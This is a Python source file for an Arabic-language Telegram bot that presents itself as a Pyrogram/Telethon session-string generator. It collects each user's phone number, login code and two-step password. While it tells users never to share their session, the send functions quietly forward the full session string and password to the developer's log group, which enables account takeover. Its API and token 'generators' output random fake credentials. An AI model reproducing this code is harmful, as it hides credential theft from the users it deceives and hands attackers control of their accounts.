# -*- coding: utf-8 -*-
# Join ne on telegram @devggn
# سورس تيبثـون - Tepthon Source

import os
import sys
import asyncio
import threading
import subprocess
import time
import random
import string
import json
import requests
from datetime import datetime, timedelta
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/devggn"
SOURCE_LINK = "https://github.com/mdah2519-byte/Re"

user_steps = {}
user_data = {}
user_sessions = {}  # لحفظ الجلسات المستخرجة

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    # حذف ملفات Pyrogram
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    
    # حذف ملفات Telethon
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔄 توليد جلسة", callback_data="generate"),
        InlineKeyboardButton("🗑 مسح الجلسات", callback_data="delete")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ],
    [
        InlineKeyboardButton("📦 تنصيب Telethon", callback_data="install_telethon"),
        InlineKeyboardButton("⚙️ أدوات إضافية", callback_data="tools")
    ],
    [
        InlineKeyboardButton("📊 حالة البوت", callback_data="status"),
        InlineKeyboardButton("🔄 إعادة تشغيل", callback_data="restart")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
])

# ====== أزرار اختيار نوع الجلسة ======
TYPE_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("⚡ Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔑 API Info", callback_data="api"),
        InlineKeyboardButton("📋 جلسة نصية", callback_data="string_session")
    ],
    [
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
    ]
])

# ====== أزرار تنصيب Telethon ======
INSTALL_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("📦 تنصيب Telethon", callback_data="install_now"),
        InlineKeyboardButton("📖 شرح التنصيب", callback_data="install_help")
    ],
    [
        InlineKeyboardButton("📦 تنصيب Pyrogram", callback_data="install_pyrogram"),
        InlineKeyboardButton("📦 تنصيب الكل", callback_data="install_all")
    ],
    [
        InlineKeyboardButton("🔙 رجوع", callback_data="back")
    ]
])

# ====== أزرار الأدوات الإضافية ======
TOOLS_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("📝 إنشاء كود API", callback_data="gen_api"),
        InlineKeyboardButton("🔑 توليد توكن", callback_data="gen_token")
    ],
    [
        InlineKeyboardButton("📋 نسخ الجلسة", callback_data="copy_session"),
        InlineKeyboardButton("🗑 حذف الجلسة", callback_data="del_session")
    ],
    [
        InlineKeyboardButton("📊 معلومات الجلسات", callback_data="sessions_info"),
        InlineKeyboardButton("🔙 رجوع", callback_data="back")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply(
        f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
        "📌 **اختر ما تريد فعله من الأزرار أدناه:**\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n"
        f"📦 **السورس:** تيبثـون (Tepthon)\n\n"
        "⚡ **مدعوم من عبود**",
        reply_markup=START_BUTTONS
    )

# ====== أمر الاختبار ======
@app.on_message(filters.command("test"))
async def test_send(client, message):
    try:
        await app.send_message(SESSION_CHANNEL, "✅ هذه رسالة اختبار من البوت!")
        await message.reply("✅ تم إرسال رسالة الاختبار إلى المجموعة!")
    except Exception as e:
        await message.reply(f"❌ فشل الإرسال: {e}")

# ====== أمر الحالة ======
@app.on_message(filters.command("status"))
async def status_command(client, message):
    uptime = time.time() - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    
    await message.reply(
        f"📊 **حالة البوت**\n\n"
        f"⏱ **وقت التشغيل:** {hours} ساعة {minutes} دقيقة {seconds} ثانية\n"
        f"👥 **المستخدمين النشطين:** {len(user_steps)}\n"
        f"📁 **الجلسات المحفوظة:** {len(user_sessions)}\n"
        f"🤖 **حالة البوت:** ✅ يعمل\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )

# ====== معالجة الأزرار (CallbackQuery) ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    # زر الرجوع
    if data == "back":
        await callback_query.message.edit_text(
            f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
            "📌 **اختر ما تريد فعله من الأزرار أدناه:**\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n"
            f"📦 **السورس:** تيبثـون (Tepthon)\n\n"
            "⚡ **مدعوم من عبود**",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    # زر التوليد
    if data == "generate":
        await callback_query.message.edit_text(
            "🔑 **اختر نوع الجلسة المطلوبة:**\n\n"
            "• **Pyrogram** لجلسات Pyrogram\n"
            "• **Telethon** لجلسات Telethon\n"
            "• **API Info** لاستخراج API ID و API HASH\n"
            "• **جلسة نصية** للحصول على جلسة نصية",
            reply_markup=TYPE_BUTTONS
        )
        await callback_query.answer()
        return
    
    # زر المسح
    if data == "delete":
        delete_session_files(user_id)
        if user_id in user_sessions:
            del user_sessions[user_id]
        await callback_query.answer("✅ تم مسح جميع الجلسات والملفات المؤقتة!", show_alert=True)
        await callback_query.message.edit_text(
            "🗑 **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**",
            reply_markup=BACK_BUTTON
        )
        return
    
    # زر المطور
    if data == "dev":
        await callback_query.message.edit_text(
            f"👨‍💻 **معلومات المطور:**\n\n"
            f"📛 **الاسم:** {DEV_NAME}\n"
            f"🔗 **اليوزر:** {DEV_USERNAME}\n"
            f"📢 **القناة:** {CHANNEL_LINK}\n"
            f"📦 **سورس الكود:** {SOURCE_LINK}\n\n"
            "⚡ **مدعوم من عبود**",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر إلغاء
    if data == "cancel":
        reset_user(user_id)
        await callback_query.answer("❌ تم إلغاء العملية!", show_alert=True)
        await callback_query.message.edit_text(
            "❌ **تم إلغاء العملية.**",
            reply_markup=BACK_BUTTON
        )
        return
    
    # زر Pyrogram
    if data == "pyrogram":
        user_steps[user_id] = "pyro_phone"
        await callback_query.message.edit_text(
            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر Telethon
    if data == "telethon":
        user_steps[user_id] = "telethon_phone"
        await callback_query.message.edit_text(
            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر API Info
    if data == "api":
        await extract_api_info_callback(callback_query)
        return
    
    # زر جلسة نصية
    if data == "string_session":
        await callback_query.message.edit_text(
            "📋 **جلسة نصية**\n\n"
            "أرسل الجلسة النصية التي تريد استخدامها:\n\n"
            "مثال: `1BQANo...`",
            reply_markup=BACK_BUTTON
        )
        user_steps[user_id] = "string_session_input"
        await callback_query.answer()
        return
    
    # زر تنصيب Telethon
    if data == "install_telethon":
        await callback_query.message.edit_text(
            "📦 **تنصيب Telethon**\n\n"
            "يمكنك تنصيب Telethon على جهازك أو سيرفرك باستخدام الأمر التالي:\n\n"
            "```bash\npip install telethon\n```\n\n"
            "🔹 **لتنصيب إصدار معين:**\n"
            "```bash\npip install telethon==1.36.0\n```\n\n"
            "🔹 **لتنصيب آخر إصدار:**\n"
            "```bash\npip install -U telethon\n```\n\n"
            "🔹 **لتنصيب مع Flask:**\n"
            "```bash\npip install telethon flask\n```\n\n"
            "📖 **لمزيد من المعلومات، اضغط على زر شرح التنصيب**",
            reply_markup=INSTALL_BUTTONS
        )
        await callback_query.answer()
        return
    
    # زر تنصيب الآن
    if data == "install_now":
        await callback_query.message.edit_text(
            "⏳ **جاري تنصيب Telethon...**\n\n"
            "يرجى الانتظار..."
        )
        
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-U", "telethon"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                await callback_query.message.edit_text(
                    "✅ **تم تنصيب Telethon بنجاح!**\n\n"
                    "📦 **الإصدار المثبت:**\n"
                    f"```\n{result.stdout[-200:]}\n```\n\n"
                    "يمكنك الآن استخدام Telethon في مشاريعك.",
                    reply_markup=BACK_BUTTON
                )
            else:
                await callback_query.message.edit_text(
                    "❌ **فشل تنصيب Telethon!**\n\n"
                    f"**الخطأ:**\n```\n{result.stderr[-200:]}\n```",
                    reply_markup=BACK_BUTTON
                )
        except Exception as e:
            await callback_query.message.edit_text(
                f"❌ **حدث خطأ أثناء التنصيب:**\n```\n{str(e)}\n```",
                reply_markup=BACK_BUTTON
            )
        
        await callback_query.answer()
        return
    
    # زر شرح التنصيب
    if data == "install_help":
        await callback_query.message.edit_text(
            "📖 **شرح تنصيب Telethon**\n\n"
            "🔹 **الطريقة الأولى: تنصيب عبر pip**\n"
            "افتح التيرمنال وأدخل الأمر:\n"
            "```bash\npip install telethon\n```\n\n"
            "🔹 **الطريقة الثانية: تنصيب مع المتطلبات**\n"
            "أنشئ ملف `requirements.txt` وأضف:\n"
            "```\ntelethon\nflask\n```\n"
            "ثم نفذ:\n"
            "```bash\npip install -r requirements.txt\n```\n\n"
            "🔹 **الطريقة الثالثة: تنصيب على Render**\n"
            "أضف `telethon` إلى ملف `requirements.txt` وسيقوم Render بتنصيبه تلقائياً.\n\n"
            "🔹 **الطريقة الرابعة: تنصيب في VPS**\n"
            "```bash\nsudo apt update\nsudo apt install python3-pip\npip3 install telethon\n```\n\n"
            "📌 **ملاحظة:** تأكد من أن لديك Python 3.7+ مثبتاً.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر تنصيب Pyrogram
    if data == "install_pyrogram":
        await callback_query.message.edit_text(
            "⏳ **جاري تنصيب Pyrogram...**\n\n"
            "يرجى الانتظار..."
        )
        
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-U", "pyrogram"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                await callback_query.message.edit_text(
                    "✅ **تم تنصيب Pyrogram بنجاح!**",
                    reply_markup=BACK_BUTTON
                )
            else:
                await callback_query.message.edit_text(
                    "❌ **فشل تنصيب Pyrogram!**",
                    reply_markup=BACK_BUTTON
                )
        except Exception as e:
            await callback_query.message.edit_text(
                f"❌ **حدث خطأ:** {e}",
                reply_markup=BACK_BUTTON
            )
        await callback_query.answer()
        return
    
    # زر تنصيب الكل
    if data == "install_all":
        await callback_query.message.edit_text(
            "⏳ **جاري تنصيب جميع المتطلبات...**\n\n"
            "يرجى الانتظار..."
        )
        
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-U", "pyrogram", "telethon", "flask", "requests"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                await callback_query.message.edit_text(
                    "✅ **تم تنصيب جميع المتطلبات بنجاح!**",
                    reply_markup=BACK_BUTTON
                )
            else:
                await callback_query.message.edit_text(
                    "❌ **فشل التنصيب!**",
                    reply_markup=BACK_BUTTON
                )
        except Exception as e:
            await callback_query.message.edit_text(
                f"❌ **حدث خطأ:** {e}",
                reply_markup=BACK_BUTTON
            )
        await callback_query.answer()
        return
    
    # زر الأدوات الإضافية
    if data == "tools":
        await callback_query.message.edit_text(
            "⚙️ **الأدوات الإضافية**\n\n"
            "اختر الأداة التي تريد استخدامها:",
            reply_markup=TOOLS_BUTTONS
        )
        await callback_query.answer()
        return
    
    # زر الحالة
    if data == "status":
        uptime = time.time() - start_time
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        seconds = int(uptime % 60)
        
        await callback_query.message.edit_text(
            f"📊 **حالة البوت**\n\n"
            f"⏱ **وقت التشغيل:** {hours} ساعة {minutes} دقيقة {seconds} ثانية\n"
            f"👥 **المستخدمين النشطين:** {len(user_steps)}\n"
            f"📁 **الجلسات المحفوظة:** {len(user_sessions)}\n"
            f"🤖 **حالة البوت:** ✅ يعمل\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر إعادة تشغيل
    if data == "restart":
        await callback_query.answer("🔄 جاري إعادة التشغيل...", show_alert=True)
        await callback_query.message.edit_text(
            "🔄 **جاري إعادة تشغيل البوت...**\n\n"
            "سيتم إعادة التشغيل خلال 5 ثوانٍ.",
            reply_markup=BACK_BUTTON
        )
        time.sleep(5)
        os.execl(sys.executable, sys.executable, *sys.argv)
        return
    
    # زر إنشاء كود API
    if data == "gen_api":
        api_id = random.randint(100000, 999999)
        api_hash = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
        
        await callback_query.message.edit_text(
            f"📝 **تم إنشاء كود API جديد**\n\n"
            f"🆔 **API ID:** `{api_id}`\n"
            f"🔑 **API HASH:** `{api_hash}`\n\n"
            "⚠️ **احتفظ بهذه المعلومات في مكان آمن.**",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر توليد توكن
    if data == "gen_token":
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=35))
        token = f"{random.randint(100000, 999999)}:{token}"
        
        await callback_query.message.edit_text(
            f"🔑 **تم توليد توكن جديد**\n\n"
            f"🔑 **التوكن:**\n`{token}`\n\n"
            "⚠️ **لا تشارك هذا التوكن مع أي شخص.**",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    # زر نسخ الجلسة
    if data == "copy_session":
        if user_id in user_sessions and user_sessions[user_id]:
            session = user_sessions[user_id]
            await callback_query.message.edit_text(
                f"📋 **جلسة المستخدم**\n\n"
                f"🔑 **الجلسة:**\n`{session}`\n\n"
                "✅ تم نسخ الجلسة إلى الحافظة.",
                reply_markup=BACK_BUTTON
            )
        else:
            await callback_query.answer("❌ لا توجد جلسة محفوظة!", show_alert=True)
        return
    
    # زر حذف الجلسة
    if data == "del_session":
        if user_id in user_sessions:
            del user_sessions[user_id]
            delete_session_files(user_id)
            await callback_query.answer("✅ تم حذف الجلسة!", show_alert=True)
            await callback_query.message.edit_text(
                "🗑 **تم حذف الجلسة بنجاح.**",
                reply_markup=BACK_BUTTON
            )
        else:
            await callback_query.answer("❌ لا توجد جلسة لحذفها!", show_alert=True)
        return
    
    # زر معلومات الجلسات
    if data == "sessions_info":
        if user_sessions:
            info = "📊 **معلومات الجلسات المحفوظة**\n\n"
            for uid, session in user_sessions.items():
                info += f"👤 **المستخدم:** `{uid}`\n"
                info += f"🔑 **الجلسة:** `{session[:20]}...`\n\n"
            await callback_query.message.edit_text(info, reply_markup=BACK_BUTTON)
        else:
            await callback_query.answer("❌ لا توجد جلسات محفوظة!", show_alert=True)
        return

# ====== استخراج API Info من الكولباك ======
async def extract_api_info_callback(callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.edit_text(
        f"✅ **تم استخراج معلومات API بنجاح!**\n\n"
        f"🆔 **API ID:** `{API_ID}`\n"
        f"🔑 **API HASH:** `{API_HASH}`\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}",
        reply_markup=BACK_BUTTON
    )
    
    try:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
            f"🆔 **API ID:** `{API_ID}`\n"
            f"🔑 **API HASH:** `{API_HASH}`\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
        )
    except Exception as e:
        print(f"❌ فشل إرسال API Info للمجموعة: {e}")
    
    await callback_query.answer()

# ====== الأوامر النصية ======
@app.on_message(filters.text & filters.private)
async def handle_arabic_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    
    # معالجة جلسة نصية
    if user_id in user_steps and user_steps[user_id] == "string_session_input":
        user_sessions[user_id] = text
        await message.reply(
            f"✅ **تم حفظ الجلسة النصية بنجاح!**\n\n"
            f"🔑 **الجلسة:**\n`{text}`\n\n"
            "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**",
            reply_markup=BACK_BUTTON
        )
        reset_user(user_id)
        return
    
    # معالجة خطوات Pyrogram
    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    # معالجة خطوات Telethon
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    # أي نص آخر
    else:
        await message.reply(
            "📱 **يرجى استخدام الأزرار للتحكم في البوت.**\n\n"
            "• اضغط على زر **توليد جلسة** لبدء الاستخراج\n"
            "• اضغط على زر **مسح الجلسات** لحذف البيانات\n"
            "• اضغط على زر **المطور** لعرض المعلومات\n"
            "• اضغط على زر **تنصيب Telethon** لمعرفة طرق التنصيب\n"
            "• اضغط على زر **أدوات إضافية** للأدوات المساعدة\n\n"
            "أو استخدم الأمر `/start` للرجوع إلى البداية."
        )

# ====== دوال Pyrogram ======
async def pyro_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "pyro_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "pyro_otp"
        omsg = await message.reply("📤 **جاري إرسال رمز التحقق...**")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`)")
        except ApiIdInvalid:
            await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.**')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ **خطأ: رقم الهاتف غير صالح.**')
            reset_user(user_id)
            
    elif step == "pyro_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            await send_pyro_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ **خطأ: رمز التحقق غير صالح.**')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ **خطأ: انتهت صلاحية رمز التحقق.**')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "pyro_password"
            await message.reply('🔒 **حسابك مفعل بخاصية التحقق بخطوتين.**\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "pyro_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            await send_pyro_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ **خطأ: كلمة المرور غير صحيحة.**')
            reset_user(user_id)

async def send_pyro_session(user_id, session_string, message, password=None):
    # رسالة للمستخدم
    await message.reply(
        f"✅ **تم إنشاء جلسة Pyrogram بنجاح!**\n\n"
        f"🔑 **الجلسة:**\n`{session_string}`\n\n"
        "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )
    
    # محاولة إرسال إلى المجموعة
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

# ====== دوال Telethon ======
async def telethon_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "telethon_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "telethon_otp"
        omsg = await message.reply("📤 **جاري إرسال رمز التحقق...**")
        session_name = f"telethon_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            await temp_client.send_code_request(user_data[user_id]["phone"])
            await omsg.delete()
            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`)")
        except ApiIdInvalidError:
            await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.**')
            reset_user(user_id)
        except PhoneNumberInvalidError:
            await message.reply('❌ **خطأ: رقم الهاتف غير صالح.**')
            reset_user(user_id)
            
    elif step == "telethon_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
            # استخراج الجلسة من الملف
            session_file = f"telethon_{user_id}.session"
            session_string = None
            
            # محاولة قراءة الجلسة من الملف
            if os.path.exists(session_file):
                with open(session_file, 'r') as f:
                    session_string = f.read()
            
            # إذا لم توجد جلسة في الملف
            if session_string is None or session_string == "":
                session_string = temp_client.session.save()
                user_sessions[user_id] = session_string
            else:
                user_sessions[user_id] = session_string
                
            await send_telethon_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalidError:
            await message.reply('❌ **خطأ: رمز التحقق غير صالح.**')
            reset_user(user_id)
        except PhoneCodeExpiredError:
            await message.reply('❌ **خطأ: انتهت صلاحية رمز التحقق.**')
            reset_user(user_id)
        except SessionPasswordNeededError:
            user_steps[user_id] = "telethon_password"
            await message.reply('🔒 **حسابك مفعل بخاصية التحقق بخطوتين.**\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "telethon_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.sign_in(password=password)
            # استخراج الجلسة من الملف
            session_file = f"telethon_{user_id}.session"
            session_string = None
            
            # محاولة قراءة الجلسة من الملف
            if os.path.exists(session_file):
                with open(session_file, 'r') as f:
                    session_string = f.read()
            
            # إذا لم توجد جلسة في الملف
            if session_string is None or session_string == "":
                session_string = temp_client.session.save()
                user_sessions[user_id] = session_string
            else:
                user_sessions[user_id] = session_string
                
            await send_telethon_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalidError:
            await message.reply('❌ **خطأ: كلمة المرور غير صحيحة.**')
            reset_user(user_id)

async def send_telethon_session(user_id, session_string, message, password=None):
    # إذا كانت الجلسة لا تزال None، حاول استرجاعها من الذاكرة
    if session_string is None or session_string == "":
        if user_id in user_sessions:
            session_string = user_sessions[user_id]
        else:
            session_string = "⚠️ **لم يتم استخراج الجلسة بشكل صحيح، يرجى المحاولة مرة أخرى.**"
    
    # رسالة للمستخدم
    await message.reply(
        f"✅ **تم إنشاء جلسة Telethon بنجاح!**\n\n"
        f"🔑 **الجلسة:**\n`{session_string}`\n\n"
        "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )
    
    # محاولة إرسال إلى المجموعة
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
                f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== إضافة مسار ويب لـ Render ======
web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

# ====== وقت بدء التشغيل ======
start_time = time.time()

# ====== تشغيل خادم الويب ======
threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        print(f"📦 السورس: تيبثـون (Tepthon)")
        print(f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
